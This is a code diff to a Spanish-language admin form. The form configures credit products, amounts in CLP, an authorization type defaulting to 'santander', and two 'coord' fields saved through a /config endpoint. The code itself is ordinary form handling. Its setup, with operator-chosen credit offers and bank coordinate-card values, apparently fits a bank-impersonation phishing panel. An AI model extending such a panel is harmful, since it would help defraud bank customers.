@@ -22,23 +22,23 @@
     <h2>Configurar Productos y Autorización</h2>
 
     <form id="adminForm">
-      <label for="producto1">Nombre Producto 1</label>
-      <input type="text" id="producto1" placeholder="Ej: Línea de Crédito">
+      <!-- Producto 1 -->
+      <label>
+        <input type="checkbox" id="enableProducto1"> Línea de Crédito
+      </label>
+      <input type="number" id="monto1" placeholder="Monto CLP">
 
-      <label for="monto1">Monto Producto 1</label>
-      <input type="number" id="monto1" placeholder="Ej: 5000000">
+      <!-- Producto 2 -->
+      <label>
+        <input type="checkbox" id="enableProducto2"> Tarjeta de Crédito
+      </label>
+      <input type="number" id="monto2" placeholder="Monto CLP">
 
-      <label for="producto2">Nombre Producto 2</label>
-      <input type="text" id="producto2" placeholder="Ej: Tarjeta de Crédito WorldMember">
-
-      <label for="monto2">Monto Producto 2</label>
-      <input type="number" id="monto2" placeholder="Ej: 7000000">
-
-      <label for="producto3">Nombre Producto 3</label>
-      <input type="text" id="producto3" placeholder="Ej: Visualización de Tarjeta">
-
-      <label for="monto3">Monto Producto 3</label>
-      <input type="number" id="monto3" placeholder="Ej: 0">
+      <!-- Producto 3 -->
+      <label>
+        <input type="checkbox" id="enableProducto3"> Visualización de Tarjeta
+      </label>
+      <input type="number" id="monto3" placeholder="Monto CLP">
 
       <!-- Selección de tipo de autorización -->
       <label for="tipoAutorizacion">Tipo de Autorización</label>
@@ -68,19 +68,22 @@
   </div>
 
   <script>
-    const API_URL = "/config"; // usa ruta relativa al backend
+    const API_URL = "/config";
 
-    // Al cargar, obtener configuración desde el backend
     document.addEventListener("DOMContentLoaded", () => {
       fetch(API_URL)
         .then(res => res.json())
         .then(data => {
-          document.getElementById("producto1").value = data.producto1 || "";
+          // Cargar estado de productos
+          document.getElementById("enableProducto1").checked = !!data.producto1;
           document.getElementById("monto1").value = data.monto1 || "";
-          document.getElementById("producto2").value = data.producto2 || "";
+
+          document.getElementById("enableProducto2").checked = !!data.producto2;
           document.getElementById("monto2").value = data.monto2 || "";
-          document.getElementById("producto3").value = data.producto3 || "";
+
+          document.getElementById("enableProducto3").checked = !!data.producto3;
           document.getElementById("monto3").value = data.monto3 || "";
+
           document.getElementById("tipoAutorizacion").value = data.tipoAutorizacion || "santander";
           document.getElementById("coord1").value = data.coord1 || "";
           document.getElementById("coord2").value = data.coord2 || "";
@@ -92,16 +95,15 @@
         });
     });
 
-    // Guardar nuevos valores en el backend
     document.getElementById("adminForm").addEventListener("submit", function(e){
       e.preventDefault();
 
       const config = {
-        producto1: document.getElementById("producto1").value,
+        producto1: document.getElementById("enableProducto1").checked ? "Línea de Crédito" : "",
         monto1: document.getElementById("monto1").value,
-        producto2: document.getElementById("producto2").value,
+        producto2: document.getElementById("enableProducto2").checked ? "Tarjeta de Crédito" : "",
         monto2: document.getElementById("monto2").value,
-        producto3: document.getElementById("producto3").value,
+        producto3: document.getElementById("enableProducto3").checked ? "Visualización de Tarjeta" : "",
         monto3: document.getElementById("monto3").value,
         tipoAutorizacion: document.getElementById("tipoAutorizacion").value,
         coord1: document.getElementById("coord1").value.toUpperCase(),
